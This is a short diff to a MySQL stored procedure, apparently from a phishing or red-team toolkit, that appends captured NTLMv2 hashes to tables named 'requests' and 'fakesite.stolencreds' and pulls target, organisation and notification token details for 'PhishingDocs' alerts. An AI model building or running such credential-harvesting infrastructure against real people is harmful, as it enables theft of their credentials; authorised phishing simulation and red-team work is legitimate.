@@ -175,8 +175,8 @@ DELIMITER ;
 DELIMITER ;;
 CREATE DEFINER=`root`@`localhost` PROCEDURE `MatchHashes`(IN InIP VARCHAR(100), IN InHash VARCHAR(1000))
 BEGIN
-UPDATE requests SET NTLMv2 = CONCAT(NTLMv2, InHash) WHERE IP = InIP;
-UPDATE fakesite.stolencreds sc SET sc.Hash = CONCAT(sc.Hash, InHash) WHERE sc.ip = InIP;
+UPDATE requests SET NTLMv2 = CONCAT(NTLMv2, '<br>', InHash) WHERE IP = InIP;
+UPDATE fakesite.stolencreds sc SET sc.Hash = CONCAT(sc.Hash, '<br>', InHash) WHERE sc.ip = InIP;
 
 SELECT DISTINCT 'PhishingDocs' as Title, rq.Target,rq.Org,nt.API_Token,nt.Channel,rq.UUID FROM requests rq 
 INNER JOIN Notifications nt on nt.UUID = rq.UUID
